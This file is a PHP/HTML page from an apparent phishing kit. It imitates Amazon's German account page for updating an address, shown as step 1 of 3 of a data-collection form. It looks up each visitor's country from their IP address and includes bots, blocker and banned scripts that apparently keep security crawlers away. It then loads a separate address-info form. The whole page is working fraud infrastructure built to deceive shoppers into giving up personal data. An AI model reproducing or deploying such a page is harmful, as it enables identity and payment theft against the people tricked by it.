<?php 
$IP = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$STRTCODE    = strtolower($COUNTRYCODE);
?>
<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include ('../banned.php');?>
<?php include ('header.php');?>
<?php ############################################################################################################################################?>
<div id="walletWebsiteContainer" class="a-container">
  <div id="headerRow" class="a-row a-spacing-micro a-grid-vertical-align a-grid-top a-ws-row">
    <div id="headerCol" class="a-column a-span12 a-text-left a-ws-span12">
      <h1 class="a-size-medium">
        <a class="a-link-normal" href="#">[ Ihr Konto ]
        </a>
        <span class="breadcrumbArrow">>
        </span>
        <span class="a-color-state">Deine Adresse
        </span>
      </h1>
    </div>
  </div>
  <div id="subHeaderRow" class="a-row a-ws-row">
    <div id="subHeaderLeftCol" class="a-column a-span12 a-text-left a-spacing-base">
      <span>Zukünftige Versandetiketten werden genau so angezeigt, wie Sie sie unten eingeben.
      </span>
    </div>
  </div>
  <div id="mainContentRow" class="a-fixed-left-grid">
    <div class="a-fixed-left-grid-inner" style="padding-left:224px">
      <div id="walletWebsiteContentColumn" class="a-text-left a-fixed-left-grid-col walletWebsiteContentColumn a-col-right" style="padding-left:0%;*width:99.6%;float:left;">
        <div id="paymentInstrumentWidgetSection" class="a-section">
          <div id="payments-portal-instrument-management-container">
            <div class="a-section pmts-portal-widget">
              <div class="a-section pmts-portal-style-container">
                <div class="a-section">
                  <div class="a-section a-spacing-none a-spacing-top-none pmts-instrument-list-edit">
                    <div class="a-section pmts-sleeve pmts-credit-cards">
                      <div class="a-fixed-left-grid">
                        <div class="a-fixed-left-grid-inner" style="padding-left:250px">
                          <div class="a-fixed-left-grid-col a-col-left" style="width:250px;margin-left:-250px;_margin-left:-125px;float:left;">
                            <h5>* Aktualisieren Sie Ihre Adresse
                            </h5>
                          </div>
                          <div class="a-fixed-left-grid-col a-col-right" style="padding-left:0%;*width:99.6%;float:left;">
                            <div class="a-fixed-right-grid">
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="a-box a-spacing-base pmts-add-cc pmts-add-credit-card-form-in-list-container">
                        <div class="a-box-inner">
                          <div class="a-fixed-right-grid">
                            <div class="a-fixed-right-grid-inner" style="padding-right:195px">
                              <div class="a-fixed-right-grid-col a-col-right" style="width:195px;margin-right:-195px;float:right;">
                                <div class="pmts-composite-logo-row">
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png');background-position: 0px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png');background-position: -45px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png');background-position: -90px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png');background-position: -135px 0; ">
                                  </span>
                                </div>
                                <div class="pmts-composite-logo-row">
                                  <span class="pmts-indiv-issuer-image" style="margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png');background-position: -180px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png');background-position: -225px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/issuer-images/sprite-map._CB332026835_.png');background-position: -270px 0; ">
                                  </span>
                                </div>
                              </div>
                              <div class="a-fixed-right-grid-col a-col-left" style="padding-right:0%;*width:99.6%;float:left;">
                                <div class="a-row a-spacing-base">Aktualisieren Sie Ihre Adresse unten.
                                </div>
                                <div class="a-row pmts-add-credit-card-form-in-list">
                                  <div class="a-column a-span12">
                                    <div class="a-section pmts-step-1">
                                      <div class="a-input-text-group">
                                        <p class="a-spacing-top-mini">
                                          <span class="a-size-base a-text-bold">Geben Sie Ihre persönlichen Daten ein
                                          </span>
                                          <span class="a-letter-space">
                                          </span>
                                          <span class="a-size-small pmts-step-unweighted">(Schritt 1 von 3)
                                          </span>
                                        </p>
                                        <div id="pmts-id-8" style="display: none;" class="pmts-mini pmts-message pmts-warning">
                                        </div>
                                        <div id="pmts-id-9" style="display: none;" class="pmts-mini pmts-message pmts-error">
                                        </div>
                                        <?php ############################################################################################################################################?>
                                        <?php include('../form/address_info.php');?>
                                        <?php include('footer.php');?>
